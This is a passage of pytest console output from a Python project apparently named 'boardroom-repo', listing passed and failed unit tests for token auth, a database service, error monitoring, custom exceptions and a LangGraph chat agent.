============================= test session starts ==============================
platform linux -- Python 3.13.5, pytest-8.3.5, pluggy-1.5.0 -- /home/paul/boardroom-repo/.venv/bin/python
cachedir: .pytest_cache
rootdir: /home/paul/boardroom-repo
configfile: pyproject.toml
plugins: mock-3.14.0, langsmith-0.3.21, cov-6.2.1, Faker-37.4.0, xdist-3.8.0, anyio-4.9.0, asyncio-1.0.0, env-1.1.5
asyncio: mode=Mode.AUTO, asyncio_default_fixture_loop_scope=function, asyncio_default_test_loop_scope=function
tests/unit/test_auth_utils.py::TestAuthUtilsLogging::test_create_access_token_logs_creation PASSED [ 45%]
tests/unit/test_auth_utils.py::TestAuthUtilsLogging::test_verify_token_logs_verification FAILED [ 45%]
tests/unit/test_auth_utils.py::TestAuthUtilsLogging::test_verify_token_logs_invalid_format PASSED [ 45%]
tests/unit/test_auth_utils.py::TestAuthUtilsLogging::test_verify_token_logs_jwt_error FAILED [ 45%]
tests/unit/test_auth_utils.py::TestAuthUtilsIntegration::test_token_roundtrip PASSED [ 46%]
tests/unit/test_auth_utils.py::TestAuthUtilsIntegration::test_different_thread_ids PASSED [ 46%]
tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_database_service_init PASSED [ 46%]
tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_success FAILED [ 46%]
tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_test_environment FAILED [ 46%]
tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_with_retries FAILED [ 46%]
tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_max_retries_exceeded PASSED [ 47%]
tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_idempotent PASSED [ 47%]
tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_context_manager PASSED [ 47%]
tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_initializes_if_needed FAILED [ 47%]
tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_operational_error_handling FAILED [ 47%]
tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_sqlalchemy_error_handling FAILED [ 47%]
tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_generic_error_handling FAILED [ 48%]
tests/unit/test_database_service.py::TestDatabaseServiceHealthCheck::test_health_check_healthy FAILED [ 48%]
tests/unit/test_database_service.py::TestDatabaseServiceHealthCheck::test_health_check_with_pool_status PASSED [ 48%]
tests/unit/test_database_service.py::TestDatabaseServiceHealthCheck::test_health_check_unhealthy PASSED [ 48%]
tests/unit/test_database_service.py::TestDatabaseServiceHealthCheck::test_health_check_initializes_if_needed FAILED [ 48%]
tests/unit/test_database_service.py::TestDatabaseServiceMigrationCheck::test_execute_migration_check_success PASSED [ 48%]
tests/unit/test_database_service.py::TestDatabaseServiceMigrationCheck::test_execute_migration_check_failure PASSED [ 49%]
tests/unit/test_database_service.py::TestDatabaseServiceUserOperations::test_create_user_success PASSED [ 49%]
tests/unit/test_database_service.py::TestDatabaseServiceCleanup::test_close_disposes_engine PASSED [ 49%]
tests/unit/test_database_service.py::TestDatabaseServiceCleanup::test_close_when_no_engine PASSED [ 49%]
tests/unit/test_database_service.py::TestDatabaseServiceSingleton::test_database_service_singleton_exists PASSED [ 49%]
tests/unit/test_database_service.py::TestDatabaseServiceSingleton::test_database_service_singleton_configuration FAILED [ 50%]
tests/unit/test_database_service.py::TestDatabaseServiceErrorHandling::test_session_error_during_operation FAILED [ 50%]
tests/unit/test_database_service.py::TestDatabaseServiceErrorHandling::test_connection_recovery_after_operational_error FAILED [ 50%]
tests/unit/test_database_service.py::TestDatabaseServiceAsyncOperations::test_concurrent_session_usage PASSED [ 50%]
tests/unit/test_database_service.py::TestDatabaseServiceAsyncOperations::test_async_context_manager_cleanup PASSED [ 50%]
tests/unit/test_database_service.py::TestDatabaseServiceConfigurationVariants::test_debug_mode_configuration FAILED [ 50%]
tests/unit/test_database_service.py::TestDatabaseServiceConfigurationVariants::test_production_mode_configuration FAILED [ 51%]
tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_create_user_with_duplicate_email FAILED [ 51%]
tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_database_transaction_rollback FAILED [ 51%]
tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_connection_pool_exhaustion PASSED [ 51%]
tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_database_connection_timeout FAILED [ 51%]
tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_concurrent_session_management PASSED [ 51%]
tests/unit/test_database_service.py::TestDatabaseServiceLegacyMethods::test_get_session_maker_method FAILED [ 52%]
tests/unit/test_error_monitoring.py::TestErrorMetric::test_error_metric_creation PASSED [ 52%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_error_monitor_initialization PASSED [ 52%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_error_monitor_default_initialization PASSED [ 52%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_record_error_first_occurrence PASSED [ 52%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_record_error_multiple_occurrences PASSED [ 52%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_record_error_window_cleanup PASSED [ 53%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_record_error_alert_threshold PASSED [ 53%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_trigger_alert_output PASSED [ 53%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_alert_rate_limiting PASSED [ 53%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_get_error_summary_recent PASSED [ 53%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_get_error_summary_empty PASSED [ 53%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_get_health_status_healthy PASSED [ 54%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_get_health_status_degraded PASSED [ 54%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_get_health_status_unhealthy PASSED [ 54%]
tests/unit/test_error_monitoring.py::TestGlobalErrorMonitor::test_global_error_monitor_exists PASSED [ 54%]
tests/unit/test_error_monitoring.py::TestGlobalErrorMonitor::test_record_error_convenience_function PASSED [ 54%]
tests/unit/test_error_monitoring.py::TestGlobalErrorMonitor::test_get_error_summary_convenience_function PASSED [ 54%]
tests/unit/test_error_monitoring.py::TestGlobalErrorMonitor::test_get_monitoring_health_convenience_function PASSED [ 55%]
tests/unit/test_error_monitoring.py::TestErrorMonitorEdgeCases::test_record_error_without_optional_params PASSED [ 55%]
tests/unit/test_error_monitoring.py::TestErrorMonitorEdgeCases::test_error_metric_path_deduplication PASSED [ 55%]
tests/unit/test_error_monitoring.py::TestErrorMonitorEdgeCases::test_error_metric_status_code_deduplication PASSED [ 55%]
tests/unit/test_error_monitoring.py::TestErrorMonitorEdgeCases::test_window_edge_case_exactly_at_cutoff FAILED [ 55%]
tests/unit/test_error_monitoring.py::TestErrorMonitorEdgeCases::test_multiple_error_types_independence PASSED [ 55%]
tests/unit/test_error_monitoring.py::TestErrorMonitorPerformance::test_large_number_of_errors PASSED [ 56%]
tests/unit/test_error_monitoring.py::TestErrorMonitorPerformance::test_memory_usage_with_window_cleanup PASSED [ 56%]
tests/unit/test_exceptions.py::TestBoardroomException::test_boardroom_exception_basic FAILED [ 56%]
tests/unit/test_exceptions.py::TestBoardroomException::test_boardroom_exception_with_all_params PASSED [ 56%]
tests/unit/test_exceptions.py::TestBoardroomException::test_boardroom_exception_to_dict PASSED [ 56%]
tests/unit/test_exceptions.py::TestBoardroomException::test_boardroom_exception_details_default PASSED [ 56%]
tests/unit/test_exceptions.py::TestValidationException::test_validation_exception_basic PASSED [ 57%]
tests/unit/test_exceptions.py::TestValidationException::test_validation_exception_with_field PASSED [ 57%]
tests/unit/test_exceptions.py::TestValidationException::test_validation_exception_with_details PASSED [ 57%]
tests/unit/test_exceptions.py::TestAuthenticationException::test_authentication_exception_default PASSED [ 57%]
tests/unit/test_exceptions.py::TestAuthenticationException::test_authentication_exception_custom_message PASSED [ 57%]
tests/unit/test_exceptions.py::TestAuthenticationException::test_authentication_exception_with_details PASSED [ 57%]
tests/unit/test_exceptions.py::TestAuthorizationException::test_authorization_exception_default PASSED [ 58%]
tests/unit/test_exceptions.py::TestAuthorizationException::test_authorization_exception_custom_message PASSED [ 58%]
tests/unit/test_exceptions.py::TestResourceNotFoundException::test_resource_not_found_basic PASSED [ 58%]
tests/unit/test_exceptions.py::TestResourceNotFoundException::test_resource_not_found_with_id PASSED [ 58%]
tests/unit/test_exceptions.py::TestResourceNotFoundException::test_resource_not_found_with_details PASSED [ 58%]
tests/unit/test_exceptions.py::TestConflictException::test_conflict_exception_basic PASSED [ 58%]
tests/unit/test_exceptions.py::TestConflictException::test_conflict_exception_with_resource PASSED [ 59%]
tests/unit/test_exceptions.py::TestDatabaseException::test_database_exception_default PASSED [ 59%]
tests/unit/test_exceptions.py::TestDatabaseException::test_database_exception_custom_message PASSED [ 59%]
tests/unit/test_exceptions.py::TestExternalServiceException::test_external_service_exception_basic PASSED [ 59%]
tests/unit/test_exceptions.py::TestExternalServiceException::test_external_service_exception_custom_message PASSED [ 59%]
tests/unit/test_exceptions.py::TestExternalServiceException::test_external_service_exception_with_details PASSED [ 59%]
tests/unit/test_exceptions.py::TestRateLimitException::test_rate_limit_exception_default PASSED [ 60%]
tests/unit/test_exceptions.py::TestRateLimitException::test_rate_limit_exception_custom_message PASSED [ 60%]
tests/unit/test_exceptions.py::TestBusinessLogicException::test_business_logic_exception_basic PASSED [ 60%]
tests/unit/test_exceptions.py::TestBusinessLogicException::test_business_logic_exception_with_rule PASSED [ 60%]
tests/unit/test_exceptions.py::TestConfigurationException::test_configuration_exception_basic PASSED [ 60%]
tests/unit/test_exceptions.py::TestConfigurationException::test_configuration_exception_with_key PASSED [ 60%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_not_found_basic PASSED [ 61%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_not_found_with_id PASSED [ 61%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_validation_error_basic PASSED [ 61%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_validation_error_with_field PASSED [ 61%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_auth_error_default PASSED [ 61%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_auth_error_custom PASSED [ 61%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_permission_error_default PASSED [ 62%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_permission_error_custom PASSED [ 62%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_conflict_error_basic PASSED [ 62%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_conflict_error_with_resource PASSED [ 62%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_database_error_default PASSED [ 62%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_database_error_custom PASSED [ 63%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_business_logic_error_basic PASSED [ 63%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_business_logic_error_with_rule PASSED [ 63%]
tests/unit/test_exceptions.py::TestExceptionInheritance::test_all_exceptions_inherit_from_boardroom_exception PASSED [ 63%]
tests/unit/test_exceptions.py::TestExceptionInheritance::test_all_exceptions_inherit_from_base_exception PASSED [ 63%]
tests/unit/test_exceptions.py::TestExceptionSerialization::test_exception_to_dict_structure PASSED [ 63%]
tests/unit/test_exceptions.py::TestExceptionSerialization::test_exception_json_serializable PASSED [ 64%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_agent_initialization PASSED [ 64%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_model_kwargs_development FAILED [ 64%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_model_kwargs_production FAILED [ 64%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_connection_pool_success PASSED [ 64%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_connection_pool_failure_production PASSED [ 64%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_chat_success FAILED [ 65%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_chat_with_token_usage FAILED [ 65%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_chat_llm_error_retry FAILED [ 65%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_chat_max_retries_exceeded FAILED [ 65%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_tool_call_success PASSED [ 65%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_tool_call_no_tools PASSED [ 65%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_tool_call_tool_not_found FAILED [ 66%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_tool_call_execution_error PASSED [ 66%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_should_continue_no_tool_calls PASSED [ 66%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_should_continue_with_tool_calls PASSED [ 66%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_create_graph_success FAILED [ 66%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_create_graph_no_checkpointer FAILED [ 66%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_response_success FAILED [ 67%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_stream_response FAILED [ 67%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_chat_history FAILED [ 67%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_clear_chat_history FAILED [ 67%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_process_messages PASSED [ 67%]
tests/unit/test_langgraph_graph.py::TestAIOperationMetrics::test_metrics_initialization PASSED [ 67%]
tests/unit/test_langgraph_graph.py::TestAIOperationMetrics::test_metrics_completion_success PASSED [ 68%]
tests/unit/test_langgraph_graph.py::TestAIOperationMetrics::test_metrics_completion_failure PASSED [ 68%]
tests/unit/test_langgraph_graph.py::TestTokenUsage::test_token_usage_calculation PASSED [ 68%]
